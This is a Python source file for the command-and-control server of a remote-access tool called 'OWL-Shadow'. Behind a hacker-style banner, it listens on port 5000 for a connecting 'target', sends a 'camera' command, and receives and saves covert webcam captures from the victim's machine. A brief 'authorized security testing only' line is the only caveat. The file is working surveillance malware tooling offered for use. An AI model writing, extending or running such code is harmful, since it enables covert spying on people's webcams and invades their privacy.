import socket
import random
import time
import os
import shutil
from colorama import Fore, Style, init

def matrix_effect(duration=2, density=0.15):
    """Matrix digital rain effect"""
    os.system("cls" if os.name == "nt" else "clear")
    cols = shutil.get_terminal_size().columns
    streams = [0] * cols
    charset = "01"
    start = time.time()
    while time.time() - start < duration:
        line = []
        for i in range(cols):
            if streams[i] == 0 and random.random() < density:
                streams[i] = random.randint(3, 10)
            if streams[i] > 0:
                ch = random.choice(charset)
                line.append(Fore.GREEN + ch + Style.RESET_ALL)
                streams[i] -= 1
            else:
                line.append(" ")
        print("".join(line))
        time.sleep(0.05)

def print_banner():
    """Hacker-style banner with the owl ASCII art"""
    os.system("cls" if os.name == "nt" else "clear")
    
    BANNER = f"""
{Fore.GREEN}   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⢀⣠⣤⣶⣶⣶⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣤⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠟⠁⢀⣈⠙⢿⣿⣿⣿⠟⠁⢀⣈⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠀⢻⣿⡿⠂⣸⣿⣿⣿⠀⢻⣿⡿⠀⣸⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣷⣤⣄⣤⣴⣿⠁⠀⣻⣷⣤⣄⣤⣴⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣧⢠⣿⣿⣿⣿⣿⣿⣿⣿⣝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⠟⣭⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣻⣻⣿⣿⠇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠿⢟⠿⢿⣿⡄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⡿⢿⣿⣿⣷⡈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣾⣷⣾⣿⣿⣷⣄⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣮⣶⣭⣭⣛⣽⣿⣿⣦⣈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣭⣯⣻⣝⣛⣿⣿⣿⣿⣶⣤⣉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀
⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣛⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣉⡛⠿⣿⣿⣿⣿⣿⣿⣇⠀
⠀⠀⠀⠀⠈⠙⠷⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣯⣽⣿⣿⣿⣿⡄
⠀⠀⠀⠀⠀⠰⣄⠀⣀⠉⠉⠛⠛⠷⠶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠙⢿⣧
⠀⠀⠀⠘⠛⠓⢉⡄⡹⠆⠀⠀⠀⠀⠀⠉⠛⠿⢷⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⡏⠛⠛⠛⠛⠛⠊⢿⣿⣿⠀⠀⠙
⠀⠀⠀⠀⠀⠀⠉⠛⠋⠢⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣷⣦⣄⣀⡀⠀⠀⢀⣀⣼⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⠀
⠈⠉⠙⠒⠲⠶⠶⢶⣶⣤⣬⣽⣶⣦⣤⣤⣤⣶⣶⣿⡿⠿⠿⠟⠛⠿⠿⠏⣴⣿⣿⠟⣛⣛⣋⣀⣀⡀⠀⠀⡀⠀⠀⠀⠀⠹⡇⠀⠀
⠀⠀⠀⠀⢀⣠⠶⠛⠋⠉⠉⠁⠀⠈⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⢏⠈⡏⠈⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣶⣦⣤⣤⠑⠀⠀
⠀⠀⠀⠐⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠿⣿⡇⠀⠀⠀
{Style.RESET_ALL}"""
    
    print(BANNER)
    print(Fore.GREEN + "I often feel that night and shadow are more alive than day and light...." + Style.RESET_ALL)
    print(Fore.RED + "Welcome, night wanderer !!" + Style.RESET_ALL)
    print(Fore.RED + "By OWL-Shadow\n\n" + Style.RESET_ALL)
    time.sleep(1)

def print_commands():
    
    print(f"\n{Fore.YELLOW}[ AVAILABLE COMMANDS ]{Style.RESET_ALL}")
    print(f"{Fore.GREEN}  camera  {Fore.WHITE}→ Capture webcam from target")
    print(f"{Fore.GREEN}  exit    {Fore.WHITE}→ Close connection and exit")
    print(f"{Fore.GREEN}  help    {Fore.WHITE}→ Show this menu")
    print(f"{Fore.RED}{'─' * 50}{Style.RESET_ALL}\n")

def save_pctr(conn):
    try:
        size_data = conn.recv(16).decode().strip()
        if not size_data:
            print(f"{Fore.RED}[-] Failed to receive image size{Style.RESET_ALL}")
            return
        
        size = int(size_data)
        print(f"{Fore.GREEN}[+] Expecting {size} bytes{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}[~] Receiving image", end="", flush=True)
        
        img_data = b""
        while len(img_data) < size:
            chunk = conn.recv(1024)
            if not chunk:
                break
            img_data += chunk
            print(".", end="", flush=True)
        
        print(f"{Style.RESET_ALL}")
        
        if len(img_data) == size:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"capture_{timestamp}.jpg"
            with open(filename, "wb") as f:
                f.write(img_data)
            print(f"{Fore.GREEN}[+] Image saved as {filename} ({size} bytes){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Incomplete: expected {size}, got {len(img_data)}{Style.RESET_ALL}")
            
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

def main():
    # Initialize colorama
    init(autoreset=True)
    
    # Matrix effect
    matrix_effect(duration=2, density=0.15)
    
   
    print_banner()
    
    print(f"{Fore.YELLOW}[!] For authorized security testing only{Style.RESET_ALL}")
    print(f"{Fore.RED}{'─' * 55}{Style.RESET_ALL}")
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 5000))
    server_socket.listen(1)
    
    print(f"{Fore.GREEN}[*] Server listening on port 5000...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Waiting for target connection{Style.RESET_ALL}\n")
    
    conn, addr = server_socket.accept()
    print(f"{Fore.GREEN}[+] Connected to {addr}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Target is ready{Style.RESET_ALL}")
    
    print_commands()
    
    while True:
        try:
            cmd = input(f"{Fore.RED}[{addr[0]}]> {Style.RESET_ALL}").strip().lower()
            
            if cmd == "camera":
                print(f"{Fore.GREEN}[+] Sending capture command...{Style.RESET_ALL}")
                conn.send(cmd.encode())
                save_pctr(conn)
                
            elif cmd == "exit":
                print(f"{Fore.YELLOW}[+] Closing connection...{Style.RESET_ALL}")
                conn.send(b"exit")
                break
                
            elif cmd == "help":
                print_commands()
                
            elif cmd == "":
                continue
                
            else:
                print(f"{Fore.RED}[-] Unknown command: {cmd}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[?] Type 'help' for available commands{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[-] Interrupted by user{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
            break
    
    conn.close()
    server_socket.close()
    print(f"{Fore.GREEN}[+] Server closed{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
